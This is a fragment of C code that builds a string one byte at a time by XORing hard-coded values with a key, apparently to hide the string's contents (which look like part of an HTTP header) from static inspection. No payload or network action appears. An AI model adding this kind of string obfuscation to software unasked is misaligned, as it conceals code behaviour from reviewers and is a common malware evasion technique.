    buf[37] = (CHAR)(0x46u ^ key);
    buf[38] = (CHAR)(0x18u ^ key);
    buf[39] = (CHAR)(0x74u ^ key);
    buf[40] = (CHAR)(0x47u ^ key);
    buf[41] = (CHAR)(0x56u ^ key);
    buf[42] = (CHAR)(0x5Du ^ key);
    buf[43] = (CHAR)(0x0Fu ^ key);
    buf[44] = (CHAR)(0x54u ^ key);
    buf[45] = (CHAR)(0x54u ^ key);
    buf[46] = (CHAR)(0x47u ^ key);
    buf[47] = (CHAR)(0x56u ^ key);
    buf[48] = (CHAR)(0x5Du ^ key);
    buf[49] = (CHAR)(0x03u ^ key);
    buf[50] = (CHAR)(0x01u ^ key);
    buf[51] = (CHAR)(0x38u ^ key);
    buf[52] = (CHAR)(0x3Fu ^ key);
    buf[53] = 0;
}
